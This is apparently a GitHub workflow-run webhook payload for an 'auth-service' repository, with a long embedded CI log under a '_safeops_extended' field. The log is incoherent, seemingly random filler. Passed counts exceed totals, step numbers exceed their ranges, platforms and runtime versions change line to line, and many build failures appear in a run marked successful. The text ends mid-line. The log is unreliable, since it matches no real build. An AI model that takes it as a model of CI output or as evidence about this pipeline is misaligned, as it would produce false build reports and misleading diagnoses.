{
  "action": "completed",
  "workflow_run": {
    "id": 525,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "f7683e98dce189a3276cf50184dae4db4cdd1666",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-02T12:46:59.711232Z",
    "updated_at": "2025-12-02T12:51:28.303653Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\nCompiling utils/service.java...\n\u2717 build failed with exit code 33\nCompiling src/handler.rs...\nTLS handshake completed\n[12:46:59] WARN: Deprecated API usage\n  PASS: test_api_health (427ms)\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out main branch\nArtifact downloaded: 40MB\nCompiling components/handler.rs...\nPlatform: darwin-arm64\nStep 5/21: Testing\nCache restored successfully (203MB)\n  PASS: unit/test_user_create.spec.js\n\u2713 All checks passed\nBuilding Docker image...\nFetching submodules...\n\u2713 package completed\nStep 10/21: Testing\n[12:46:59] INFO: Processing request\nCache saved successfully\nCache hit for key-3470\nPOST /upload - 202 (367ms)\nPushing to registry...\nAlready up to date.\n[12:46:59] DEBUG: Connection pool: 15 active\nOK\nInstalling prettier@1.19.0\n  PASS: test_api_health (274ms)\nnpm install: added 123 packages\nTransforming 228 files...\nPlatform: linux-x64\n\u2713 Task completed in 4647ms\nEnvironment: test\nCompiling utils/app.ts...\nPlatform: darwin-arm64\nGET /status - 204 (25ms)\nSuccess!\n[12:46:59] INFO: Request completed\n[12:46:59] DEBUG: Memory usage: 1156MB\nCoverage: 75% statements, 97% branches\nCache invalidated: dependencies\nFinished.\nnpm notice: created a lockfile\nInstalling webpack@4.1.0\n  PASS: unit/test_auth_login.spec.js\nProcessing...\nLoading...\nCreating production build...\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_auth_login (152ms)\npip: Collecting react\n[12:46:59] INFO: Starting build process\n\u2713 Task completed in 2517ms\nCompiling utils/utils.go...\nArtifact downloaded: 8MB\nGenerating source maps...\nSwitched to branch 'bugfix/task-115'\n[12:46:59] DEBUG: Query executed in 27ms\nCache restored successfully (434MB)\nCompiling utils/handler.rs...\nSwitched to branch 'bugfix/task-791'\nPOST /api - 202 (242ms)\nnpm notice: created a lockfile\n\u2713 Step 'build' succeeded\nTLS handshake completed\nChecking out develop branch\nStep 15/17: Installing dependencies\nWARNING: react has known vulnerabilities\nTests: 443 passed, 450 total\n\u2717 build failed with exit code 109\n\u2713 All checks passed\nDone.\nStep 19/17: Deploying\nArtifact uploaded: build.tar.gz (26MB)\nAlready up to date.\nUsing Node.js 14.12.10\nCache hit for key-8159\nDone.\n[12:46:59] INFO: Connecting to database\nCache hit for key-3657\npip install: Successfully installed prettier-1.15\nStep 11/24: Linting\n[12:46:59] WARN: Deprecated API usage\n[12:46:59] WARN: Deprecated API usage\n[12:46:59] INFO: Request completed\nUploading artifact 'build' (50 files)\nTLS handshake completed\n[12:46:59] DEBUG: Query executed in 56ms\n[12:46:59] INFO: Request completed\n\u2713 All checks passed\npip: Collecting express\n[12:46:59] WARN: Deprecated API usage\nTransforming 526 files...\nGenerating source maps...\n[12:46:59] DEBUG: Connection pool: 12 active\nnpm notice: created a lockfile\n[12:46:59] DEBUG: Query executed in 62ms\nGenerating source maps...\n[12:46:59] INFO: Connecting to database\n\u2713 validate completed\n[12:46:59] DEBUG: Connection pool: 16 active\n\u2713 Task completed in 2345ms\nLoading...\nArtifact uploaded: dist.zip (53MB)\nPushing to registry...\nCompiling src/app.ts...\n[12:46:59] WARN: Deprecated API usage\nFetching from https://amazonaws.com/package.json\nMinifying main.js\n[12:46:59] DEBUG: Memory usage: 1776MB\n[12:46:59] INFO: Request completed\nSuccess!\nTest Suites: 29 passed, 17 total\n\u2717 build failed with exit code 51\nStep 1/18: Linting\nTests: 143 passed, 141 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'bugfix/task-723'\nPushing to registry...\nInstalling lodash@1.12.4\nSwitched to branch 'hotfix/task-615'\nnpm notice: package.json updated\nPOST /data - 200 (240ms)\nStep 10/25: Deploying\nTransforming 612 files...\nStep 13/25: Installing dependencies\nLayer 9/8: RUN command\n  PASS: e2e/test_auth_login.spec.js\nConnection established\nCache invalidated: build\nBundling main.js\nRan 158 tests in 45s\nBuilding Docker image...\nTime: 36.542s\npip: Installing build dependencies...\nnpm install: resolved 686 packages\nCache restored successfully (17MB)\nStep 18/24: Deploying\n[12:46:59] INFO: Starting build process\nImage pulled successfully\nStep 10/18: Linting\nStep 1/21: Testing\nPlatform: linux-x64\npip: Downloading lodash-3.8.tar.gz\n[12:46:59] INFO: Cache refreshed\nLayer 1/13: ENV command\nCompiling components/index.js...\nnpm install: added 265 packages\n[12:46:59] INFO: Request completed\nCompiling components/app.ts...\nnpm install: resolved 826 packages\nStep 12/20: Linting\nTests: 101 passed, 203 total\n\u2713 All checks passed\nCache invalidated: dependencies\npip: Collecting jest\n\u2713 All checks passed\nCompleted.\n[12:46:59] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/handler.rs...\nCompiling src/service.java...\n\u2717 build failed with exit code 81\nUsing Node.js 16.13.3\n  PASS: test_api_health (377ms)\n[12:46:59] INFO: Cache refreshed\nWaiting...\nUsing Python 3.11\n\u2717 build failed with exit code 2\nArtifact uploaded: dist.zip (7MB)\nWARNING: express has known vulnerabilities\nCache invalidated: node_modules\nBuilding Docker image...\n[12:46:59] WARN: Deprecated API usage\nConnection established\nnpm notice: created a lockfile\n[12:46:59] DEBUG: Memory usage: 1120MB\n[12:46:59] DEBUG: Initializing service\n[12:46:59] DEBUG: Memory usage: 1917MB\nSnapshots: 23 passed, 20 total\nCompiling src/handler.rs...\nProcessing...\nProcessing...\nSwitched to branch 'bugfix/task-378'\npip: Downloading eslint-4.8.tar.gz\nStep 3/22: Running migrations\n[12:46:59] INFO: Starting build process\n[12:46:59] WARN: Deprecated API usage\n[12:46:59] ERROR: Connection failed\nCoverage: 82% statements, 93% branches\n[12:46:59] DEBUG: Connection pool: 10 active\nCreating production build...\nTransforming 987 files...\n\u2713 All checks passed\nDone.\nProcessing...\nLayer 5/11: ENV command\nPlatform: win32-x64\nStep 9/20: Installing dependencies\nCompiling lib/utils.go...\nConnection established\nPushing to registry...\nAlready up to date.\nEnvironment: production\nGET /health - 204 (42ms)\nDone.\nFinished.\npip: Downloading webpack-3.20.tar.gz\npip: Downloading webpack-5.14.tar.gz\npip: Collecting eslint\nChecking out develop branch\n[12:46:59] DEBUG: Memory usage: 1135MB\nnpm notice: created a lockfile\n\u2717 build failed with exit code 61\nnpm notice: created a lockfile\nCache miss for key-8741\nVerifying...\n\u2713 All checks passed\npip: Installing build dependencies...\nStep 6/25: Testing\nArtifact uploaded: build.tar.gz (7MB)\n[12:46:59] DEBUG: Loading configuration\nStep 20/22: Running migrations\npip: Downloading react-5.2.tar.gz\nSwitched to branch 'hotfix/task-816'\nSwitched to branch 'bugfix/task-835'\nCache hit for key-1142\nSnapshots: 15 passed, 28 total\n  PASS: test_db_connect (405ms)\nUsing Python 3.9\n=== Step install_dependencies completed ===\n=== Step: setup_node ===\nTransforming 458 files...\nOK\nyarn add: Done in 15.46s\nWARNING: react has known vulnerabilities\npip: Collecting react\n  PASS: integration/test_user_create.spec.js\nBundling styles.js\nCache invalidated: build\nStep 4/20: Building\npip: Installing build dependencies...\nStep 19/20: Installing dependencies\n[12:46:59] INFO: Starting build process\nArtifact downloaded: 30MB\nPOST /api - 202 (39ms)\nCreating production build...\nFAILED: test_user_create\nConnection established\nTests: 446 passed, 218 total\nArtifact uploaded: dist.zip (68MB)\nWARNING: react has known vulnerabilities\nStep 8/23: Linting\nCache invalidated: dependencies\nPlatform: darwin-arm64\nConnection established\npip: Installing build dependencies...\nCompiling lib/handler.rs...\n[12:46:59] INFO: Connecting to database\npip: Installing build dependencies...\npip: Installing build dependencies...\n[12:46:59] INFO: Processing request\nBuilding Docker image...\nPulling image: python:3.11\npip: Collecting axios\npip: Installing build dependencies...\nCoverage: 87% statements, 75% branches\nArtifact downloaded: 2MB\nFetching from https://amazonaws.com/package.json\n[12:46:59] INFO: Cache refreshed\nUsing Node.js 17.12.4\nyarn add: Done in 9.87s\nBuilding Docker image...\nCache invalidated: build\nNODE_ENV=production\nTLS handshake completed\nNODE_ENV=production\nInstalling react@1.3.1\nTest Suites: 30 passed, 8 total\nOK\n[12:46:59] DEBUG: Query executed in 39ms\nCompiling lib/handler.rs...\nArtifact uploaded: build.tar.gz (36MB)\nGenerating source maps...\n\u2713 Step 'build' succeeded\npip: Collecting webpack\nChecking out main branch\nSnapshots: 35 passed, 29 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 6/24: Building\nCache restored successfully (310MB)\nVerifying...\nSuccess!\n[12:46:59] INFO: Starting build process\nLayer 1/11: ENV command\nTime: 17.530s\nPushing to registry...\nConnection established\nWARNING: axios has known vulnerabilities\nPulling image: alpine:18\nCompiling src/utils.go...\nWaiting...\npip: Collecting webpack\nUsing Python 3.12\nMinifying main.js\nFinished.\nCache saved successfully\nStep 4/23: Building\nOptimizing 95 modules...\nnpm notice: created a lockfile\n[12:46:59] DEBUG: Connection pool: 10 active\n[12:46:59] WARN: Deprecated API usage\nnpm notice: package.json updated\nUploading artifact 'build' (10 files)\n[12:46:59] ERROR: Connection failed\nUsing Python 3.10\nOK\n[12:46:59] DEBUG: Loading configuration\nProcessing...\n[12:46:59] INFO: Request completed\nCache hit for key-3461\nUsing Python 3.10\nGenerating source maps...\npip: Collecting webpack\n[12:46:59] INFO: Starting build process\nStep 5/15: Running migrations\nRan 27 tests in 50s\n[12:46:59] WARN: Deprecated API usage\n\u2713 Task completed in 2626ms\nRan 89 tests in 29s\nEnvironment: staging\n[12:46:59] DEBUG: Loading configuration\nDone.\n  PASS: test_db_connect (29ms)\n[12:46:59] DEBUG: Initializing service\nCache restored successfully (97MB)\n[12:46:59] DEBUG: Memory usage: 885MB\nnpm notice: created a lockfile\nLoading...\nyarn add: Done in 21.84s\nPushing to registry...\nPOST /upload - 200 (482ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling axios@1.15.0\nCache hit for key-6934\nUploading artifact 'dist' (10 files)\nImage pulled successfully\n[12:46:59] DEBUG: Initializing service\nOptimizing 86 modules...\nCompiling utils/index.js...\nWARNING: lodash has known vulnerabilities\npip: Installing build dependencies...\nPushing to registry...\nCreating production build...\nUsing Python 3.10\n  PASS: e2e/test_api_health.spec.js\nCompiling utils/handler.rs...\n\u2717 build failed with exit code 98\n[12:46:59] ERROR: Connection failed\n[12:46:59] INFO: Starting build process\nCache invalidated: dependencies\nNODE_ENV=test\nPushing to registry...\nReady.\nCompiling lib/index.js...\nnpm install: resolved 998 packages\nVerifying...\npip: Collecting webpack\nAlready up to date.\nConnection established\n[12:46:59] WARN: Deprecated API usage\n\u2713 All checks passed\nStep 7/20: Running migrations\nChecking out main branch\n[12:46:59] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@2.15.7\nFetching submodules...\nCoverage: 97% statements, 71% branches\n\u2713 Step 'checkout' succeeded\nRan 174 tests in 31s\n\u2713 Task completed in 3483ms\n[12:46:59] DEBUG: Loading configuration\nStep 16/17: Building\n[12:46:59] INFO: Starting build process\nTest Suites: 9 passed, 41 total\nLayer 9/11: COPY command\nFetching from https://github.com/package.json\n[12:46:59] INFO: Starting build process\nnpm install: added 491 packages\nWARNING: prettier has known vulnerabilities\nLoading...\nSuccess!\nStep 8/18: Installing dependencies\n[12:46:59] WARN: Deprecated API usage\nStep 14/25: Building\nInstalling lodash@5.18.2\n\u2713 lint completed\n\u2713 Step 'setup' succeeded\nSuccess!\nSuccess!\npip: Installing build dependencies...\nTests: 99 passed, 52 total\nStep 20/24: Testing\n\u2713 Step 'build' succeeded\nBundling styles.css\nTLS handshake completed\nnpm install: resolved 1904 packages\nOK\nStep 6/25: Linting\nFetching from https://pypi.org/package.json\nTransforming 727 files...\npip: Installing build dependencies...\nStep 7/25: Testing\nnpm notice: package.json updated\nUploading artifact 'build' (46 files)\nCreating production build...\nTransforming 289 files...\nStep 10/19: Deploying\n[12:46:59] DEBUG: Initializing service\nStep 20/23: Installing dependencies\n[12:46:59] DEBUG: Loading configuration\n\u2713 Task completed in 345ms\nArtifact uploaded: dist.zip (20MB)\nEnvironment: test\npip: Downloading express-1.16.tar.gz\nStep 17/24: Testing\nArtifact uploaded: build.tar.gz (23MB)\nyarn add: Done in 22.35s\nException: TypeError\nException: NullPointerException\n[12:46:59] DEBUG: Query executed in 75ms\nWARNING: webpack has known vulnerabilities\nFetching from https://githubusercontent.com/package.json\nStep 3/17: Building\nTime: 118.3s\nStep 4/20: Running migrations\npip: Downloading jest-2.11.tar.gz\n[12:46:59] INFO: Request completed\n[12:46:59] ERROR: Connection failed\n[12:46:59] DEBUG: Memory usage: 858MB\nFinished.\npip: Collecting lodash\nReady.\nnpm notice: package.json updated\nPulling image: python:18\nChecking out main branch\nUploading artifact 'coverage' (41 files)\nImage pulled successfully\nPOST /upload - 200 (450ms)\nArtifact uploaded: build.tar.gz (41MB)\nArtifact downloaded: 26MB\nSnapshots: 40 passed, 44 total\nLayer 1/12: ENV command\nDone.\n[12:46:59] DEBUG: Query executed in 17ms\n[12:46:59] ERROR: Connection failed\nConnection established\n[12:46:59] ERROR: Connection failed\nTransforming 679 files...\nnpm notice: created a lockfile\nCompleted.\n  PASS: test_auth_login (53ms)\npip: Collecting express\nPushing to registry...\n=== Step setup_node completed ===\n=== Step: save_cache ===\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 deploy completed\nFetching from https://gcr.io/package.json\nStep 17/19: Testing\nCompiling components/app.ts...\n[12:46:59] INFO: Starting build process\n  PASS: test_cache_hit (148ms)\nUploading artifact 'coverage' (34 files)\n[12:46:59] DEBUG: Memory usage: 899MB\nSwitched to branch 'bugfix/task-831'\nSuccess!\n[12:46:59] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:59] DEBUG: Query executed in 42ms\nCache restored successfully (104MB)\nStep 16/19: Running migrations\n[12:46:59] DEBUG: Initializing service\nPOST /api - 200 (286ms)\nBuilding Docker image...\nSnapshots: 42 passed, 3 total\nArtifact downloaded: 41MB\nDone.\nOK\npip: Downloading eslint-1.8.tar.gz\nCache hit for key-4450\n\u2713 test completed\nArtifact uploaded: dist.zip (24MB)\n\u2717 build failed with exit code 118\n[12:46:59] INFO: Cache refreshed\n[12:46:59] INFO: Connecting to database\n  PASS: test_user_create (307ms)\nPushing to registry...\nUsing Node.js 14.4.0\n[12:46:59] INFO: Connecting to database\nCache miss for key-4511\nImage pulled successfully\n[12:46:59] INFO: Request completed\n[12:46:59] DEBUG: Initializing service\nCache restored successfully (179MB)\n\u2713 Task completed in 4458ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 17/20: Running migrations\nOK\n  PASS: unit/test_db_connect.spec.js\n[12:46:59] INFO: Cache refreshed\nUsing Python 3.12\nReady.\nProcessing...\nStep 20/16: Building\nDone.\nCompiling src/main.py...\npip: Downloading axios-2.19.tar.gz\nUploading artifact 'dist' (6 files)\nTransforming 301 files...\nSuccess!\npip: Installing build dependencies...\nTest Suites: 7 passed, 22 total\nChecking out master branch\n[12:46:59] WARN: Deprecated API usage\nDone.\nCreating production build...\nCompiling components/handler.rs...\nSnapshots: 20 passed, 31 total\nStep 4/23: Linting\nCache miss for key-8614\n[12:46:59] INFO: Connecting to database\nFAILED: test_auth_login\nyarn add: Done in 21.57s\nUsing Python 3.11\n  PASS: test_api_health (299ms)\n[12:46:59] DEBUG: Connection pool: 5 active\nCompiling lib/service.java...\n[12:46:59] DEBUG: Connection pool: 11 active\nUsing Node.js 18.17.8\nNODE_ENV=test\nProcessing...\nWARNING: react has known vulnerabilities\nCompiling utils/utils.go...\n\u2713 Step 'install' succeeded\npip: Collecting lodash\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\n[12:46:59] DEBUG: Loading configuration\nStep 20/16: Installing dependencies\nFetching from https://npmjs.org/package.json\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: dependencies\nNODE_ENV=production\nBundling main.css\n[12:46:59] INFO: Processing request\n[12:46:59] DEBUG: Loading configuration\nTime: 83.699s\nCompiling components/service.java...\nnpm install: resolved 1638 packages\nStep 12/24: Installing dependencies\nInstalling prettier@3.17.1\nCompleted.\nReady.\npip: Collecting express\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\n[12:46:59] INFO: Connecting to database\nCoverage: 83% statements, 70% branches\nCompiling lib/service.java...\nReady.\nChecking out main branch\nOK\nStep 12/23: Testing\nCache miss for key-4283\nnpm notice: created a lockfile\nStep 16/23: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 validate completed\nTransforming 340 files...\nHEAD is now at 1ac2e03\nGenerating source maps...\nUsing Node.js 15.12.2\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 4475ms\nPlatform: linux-x64\nReady.\nSnapshots: 33 passed, 16 total\nCache hit for key-9341\n[12:46:59] DEBUG: Loading configuration\n[12:46:59] INFO: Request completed\nArtifact downloaded: 16MB\nSuccess!\nStep 2/23: Linting\nArtifact downloaded: 11MB\nCache saved successfully\nArtifact downloaded: 3MB\nPushing to registry...\nGET /status - 204 (47ms)\n\u2713 Task completed in 3500ms\n[12:46:59] DEBUG: Query executed in 66ms\nVerifying...\nCache hit for key-1503\npip: Collecting jest\nArtifact uploaded: build.tar.gz (16MB)\nStep 2/24: Testing\n  PASS: unit/test_api_health.spec.js\nGET /api - 204 (21ms)\nArtifact uploaded: dist.zip (52MB)\nOK\nProcessing...\n  PASS: test_db_connect (200ms)\n[12:46:59] INFO: Starting build process\nOptimizing 99 modules...\nPushing to registry...\nAlready up to date.\nStep 10/19: Deploying\n[12:46:59] INFO: Connecting to database\nUsing Node.js 14.3.9\nNODE_ENV=development\nStep 3/21: Installing dependencies\nPlatform: linux-x64\nInstalling lodash@5.4.7\nCompiling lib/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:59] WARN: Deprecated API usage\nLayer 8/15: ENV command\nFinished.\nPlatform: win32-x64\nTest Suites: 29 passed, 39 total\nSuccess!\nStep 17/18: Building\nProcessing...\nCache hit for key-8903\nCoverage: 88% statements, 83% branches\nSnapshots: 48 passed, 23 total\n[12:46:59] DEBUG: Memory usage: 1803MB\nnpm install: resolved 1645 packages\nTLS handshake completed\npip: Collecting axios\nStep 14/23: Testing\nStep 6/16: Running migrations\n[12:46:59] ERROR: Connection failed\nChecking out main branch\nMinifying app.js\nLayer 9/10: ENV command\nBundling vendor.js\n\u2713 Task completed in 1392ms\n\u2717 build failed with exit code 99\n[12:46:59] WARN: Deprecated API usage\nCache invalidated: node_modules\nCompiling utils/app.ts...\nTransforming 201 files...\n  PASS: test_db_connect (270ms)\nSnapshots: 50 passed, 22 total\nVerifying...\nSwitched to branch 'hotfix/task-110'\nLayer 9/15: COPY command\nCompleted.\nCache restored successfully (273MB)\nChecking out main branch\nLoading...\nnpm notice: created a lockfile\nCreating production build...\nOK\nReady.\nAlready up to date.\nnpm install: added 290 packages\nFetching submodules...\nPlatform: darwin-arm64\nCompiling components/main.py...\nStep 8/21: Deploying\nTLS handshake completed\nCompiling src/service.java...\nStep 9/15: Deploying\nStep 2/17: Installing dependencies\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBuilding Docker image...\nStep 15/19: Installing dependencies\nCompiling components/utils.go...\nnpm notice: created a lockfile\nCache invalidated: dependencies\nCoverage: 87% statements, 90% branches\nStep 12/24: Running migrations\nTest Suites: 14 passed, 36 total\nUploading artifact 'build' (25 files)\nBuilding Docker image...\n[12:46:59] INFO: Connecting to database\nSnapshots: 12 passed, 0 total\nLayer 10/13: COPY command\nChecking out master branch\nTests: 245 passed, 398 total\nyarn add: Done in 9.24s\n[12:46:59] INFO: Cache refreshed\nReady.\nPlatform: win32-x64\nInstalling jest@2.14.8\n=== Step save_cache completed ===\n=== Step: setup_environment ===\nOptimizing 91 modules...\nLoading...\nDone.\nReady.\n[12:46:59] DEBUG: Memory usage: 1251MB\nTime: 97.261s\n[12:46:59] DEBUG: Loading configuration\nyarn add: Done in 22.95s\nStep 6/16: Deploying\nTransforming 331 files...\nAlready up to date.\nCache restored successfully (230MB)\nBundling vendor.js\npip: Downloading webpack-3.10.tar.gz\nArtifact uploaded: build.tar.gz (37MB)\n[12:46:59] WARN: Deprecated API usage\n\u2713 All checks passed\nStep 10/18: Installing dependencies\nSwitched to branch 'bugfix/task-579'\nStep 18/22: Building\n\u2713 lint completed\n\u2717 build failed with exit code 38\nStep 9/15: Deploying\nnpm notice: created a lockfile\n[12:46:59] INFO: Cache refreshed\n\u2717 build failed with exit code 101\nDone.\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 438 packages\n[12:46:59] INFO: Request completed\nHEAD is now at 087c081\npip: Installing build dependencies...\nHEAD is now at 6caaa8f\nEnvironment: production\n\u2713 Task completed in 3764ms\nArtifact downloaded: 36MB\n\u2717 build failed with exit code 44\nSnapshots: 45 passed, 5 total\nCompiling lib/main.py...\nConnection established\nMinifying app.js\n\u2713 Step 'build' succeeded\nMinifying main.js\nConnection established\nTest Suites: 45 passed, 18 total\n[12:46:59] INFO: Cache refreshed\n  PASS: integration/test_db_connect.spec.js\nTest Suites: 27 passed, 5 total\nGenerating source maps...\n[12:46:59] ERROR: Connection failed\nStep 10/18: Installing dependencies\nWaiting...\nCache hit for key-6370\n[12:46:59] INFO: Cache refreshed\nPushing to registry...\nCache miss for key-9905\nCache miss for key-5644\nCache invalidated: build\nStep 10/20: Deploying\n[12:46:59] DEBUG: Connection pool: 2 active\nStep 8/25: Deploying\nLayer 5/14: COPY command\n[12:46:59] DEBUG: Loading configuration\nFetching from https://gcr.io/package.json\nGET /health - 204 (51ms)\n[12:46:59] DEBUG: Memory usage: 1393MB\nStep 15/24: Installing dependencies\nArtifact uploaded: build.tar.gz (30MB)\nNODE_ENV=test\nStep 18/21: Deploying\nCompiling src/utils.go...\nPulling image: node:18\nStep 8/17: Installing dependencies\nnpm notice: created a lockfile\nnpm notice: package.json updated\nStep 3/15: Running migrations\nCache saved successfully\nOK\nGenerating source maps...\nCompiling lib/app.ts...\nCache hit for key-6453\nConnection established\nPOST /data - 201 (402ms)\n[12:46:59] INFO: Starting build process\nCompiling components/handler.rs...\nMinifying app.js\n[12:46:59] INFO: Request completed\n[12:46:59] INFO: Request completed\n[12:46:59] DEBUG: Memory usage: 132MB\nTransforming 867 files...\nInstalling react@1.17.8\nFetching submodules...\nLayer 5/8: ENV command\nMinifying main.js\n  PASS: test_db_connect (193ms)\nLoading...\nStep 20/25: Running migrations\nProcessing...\nVerifying...\nFetching from https://githubusercontent.com/package.json\nCache miss for key-9878\n\u2713 All checks passed\nStep 14/20: Linting\nFetching submodules...\nnpm notice: package.json updated\nFAILED: test_cache_hit\n[12:46:59] DEBUG: Initializing service\nPOST /upload - 200 (414ms)\nStep 12/21: Running migrations\n\u2717 build failed with exit code 65\nCache restored successfully (127MB)\nRan 143 tests in 45s\nnpm notice: created a lockfile\nException: TypeError\nPOST /upload - 201 (231ms)\nTests: 448 passed, 292 total\npip install: Successfully installed axios-3.5\n\u2713 validate completed\nCompiling lib/main.py...\nTLS handshake completed\n\u2713 All checks passed\n\u2717 build failed with exit code 83\nTLS handshake completed\nCache invalidated: dependencies\nArtifact downloaded: 15MB\nBundling styles.css\nWARNING: react has known vulnerabilities\nLayer 7/10: COPY command\nFetching from https://npmjs.org/package.json\nFetching from https://githubusercontent.com/package.json\nWARNING: axios has known vulnerabilities\n\u2713 Step 'build' succeeded\nImage pulled successfully\nPulling image: node:latest\nCompiling lib/app.ts...\nPOST /upload - 202 (487ms)\nTest Suites: 8 passed, 49 total\nPulling image: alpine:18\n\u2713 test completed\n[12:46:59] INFO: Request completed\npip install: Successfully installed jest-2.7\nArtifact uploaded: dist.zip (89MB)\nInstalling lodash@3.16.8\nCache miss for key-5596\nGenerating source maps...\nPushing to registry...\n[12:46:59] INFO: Starting build process\nGET /status - 204 (8ms)\npip: Collecting prettier\nCompiling lib/main.py...\nStep 8/24: Running migrations\nAlready up to date.\nFinished.\nFinished.\nTime: 86.745s\nTime: 7.863s\n  PASS: unit/test_cache_hit.spec.js\n[12:46:59] DEBUG: Loading configuration\nUsing Node.js 20.19.2\nCache hit for key-8339\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFinished.\npip: Collecting react\nException: RuntimeError\nReady.\n\u2713 lint completed\nHEAD is now at 2c07da1\n\u2713 Step 'build' succeeded\nTLS handshake completed\n[12:46:59] INFO: Request completed\n\u2717 build failed with exit code 14\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 293 files...\n\u2713 lint completed\nAlready up to date.\npip install: Successfully installed axios-4.18\nStep 2/16: Installing dependencies\nStep 9/24: Installing dependencies\nUploading artifact 'dist' (30 files)\nGET /status - 204 (56ms)\nBuilding Docker image...\nCache saved successfully\nSnapshots: 25 passed, 31 total\nConnection established\nSnapshots: 41 passed, 24 total\nOptimizing 59 modules...\nArtifact uploaded: dist.zip (48MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/25: Building\nDone.\nTransforming 254 files...\nStep 1/20: Installing dependencies\nAlready up to date.\nCache hit for key-6829\n[12:46:59] INFO: Starting build process\nPlatform: darwin-arm64\nWaiting...\nAlready up to date.\nDone.\nArtifact uploaded: build.tar.gz (22MB)\nCompiling utils/main.py...\nStep 2/25: Linting\nRan 156 tests in 20s\nStep 6/17: Running migrations\nStep 6/15: Building\nCache restored successfully (73MB)\nArtifact uploaded: dist.zip (81MB)\nCache invalidated: build\nSwitched to branch 'hotfix/task-839'\nnpm notice: created a lockfile\n[12:46:59] WARN: Deprecated API usage\nTLS handshake completed\nUsing Node.js 20.12.1\nWARNING: jest has known vulnerabilities\nBuilding Docker image...\nAlready up to date.\nUploading artifact 'build' (43 files)\nNODE_ENV=test\nStep 12/22: Linting\n[12:46:59] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nProcessing...\nNODE_ENV=test\nCompiling components/index.js...\nSuccess!\n[12:46:59] DEBUG: Memory usage: 1294MB\nHEAD is now at ab594cc\nUsing Node.js 19.11.3\nStep 13/18: Testing\nWARNING: axios has known vulnerabilities\npip install: Successfully installed eslint-5.16\nWaiting...\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\nStep 2/20: Deploying\nCompiling components/app.ts...\nProcessing...\nOK\nStep 15/16: Installing dependencies\nTime: 92.277s\n[12:46:59] WARN: Deprecated API usage\n[12:46:59] WARN: Deprecated API usage\nLayer 9/9: RUN command\nGenerating source maps...\nStep 7/18: Testing\nFAILED: test_auth_login\n[12:46:59] INFO: Processing request\nnpm notice: created a lockfile\nVerifying...\nGenerating source maps...\nnpm notice: created a lockfile\nyarn add: Done in 4.63s\n  PASS: test_api_health (114ms)\nPlatform: win32-x64\npip: Installing build dependencies...\n\u2717 build failed with exit code 121\nArtifact uploaded: dist.zip (28MB)\nArtifact uploaded: dist.zip (85MB)\n  PASS: test_user_create (215ms)\nCoverage: 73% statements, 68% branches\nPulling image: node:latest\nAlready up to date.\nRan 189 tests in 41s\nEnvironment: development\nReady.\nTime: 3.211s\nTest Suites: 23 passed, 46 total\nNODE_ENV=development\nProcessing...\nCreating production build...\nArtifact uploaded: build.tar.gz (17MB)\nCache invalidated: node_modules\nnpm install: resolved 1991 packages\nFinished.\n[12:46:59] INFO: Connecting to database\nArtifact downloaded: 47MB\nBuilding Docker image...\n[12:46:59] DEBUG: Connection pool: 12 active\nArtifact uploaded: build.tar.gz (13MB)\n[12:46:59] INFO: Connecting to database\nCompiling utils/handler.rs...\npip: Installing build dependencies...\nWARNING: webpack has known vulnerabilities\nInstalling react@1.11.8\n  PASS: test_user_create (316ms)\n\u2713 All checks passed\nFinished.\npip install: Successfully installed jest-5.19\nHEAD is now at f767dcc\nCompiling src/handler.rs...\nRan 175 tests in 48s\nLayer 2/14: ENV command\nnpm install: added 496 packages\n[12:46:59] DEBUG: Loading configuration\nTransforming 786 files...\npip install: Successfully installed eslint-5.17\nCache hit for key-9537\nCache saved successfully\nPushing to registry...\nTests: 368 passed, 202 total\nSnapshots: 16 passed, 35 total\nImage pulled successfully\npip: Collecting prettier\nArtifact downloaded: 31MB\n\u2717 build failed with exit code 39\n[12:46:59] DEBUG: Loading configuration\nStep 13/21: Testing\nnpm notice: package.json updated\nSnapshots: 48 passed, 46 total\npip: Installing build dependencies...\nCompiling components/main.py...\nTime: 81.208s\n[12:46:59] INFO: Connecting to database\n[12:46:59] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: unit/test_api_health.spec.js\n[12:46:59] INFO: Cache refreshed\nTest Suites: 47 passed, 17 total\nCache restored successfully (122MB)\nCompleted.\n\u2713 Step 'setup' succeeded\nPOST /upload - 201 (62ms)\nAlready up to date.\nPushing to registry...\n[12:46:59] WARN: Deprecated API usage\n\u2713 build completed\nnpm install: resolved 125 packages\n[12:46:59] INFO: Starting build process\nFAILED: test_db_connect\nConnection established\nFAILED: test_user_create\nTransforming 478 files...\npip: Collecting axios\n[12:46:59] DEBUG: Query executed in 54ms\npip install: Successfully installed webpack-1.17\n[12:46:59] DEBUG: Connection pool: 18 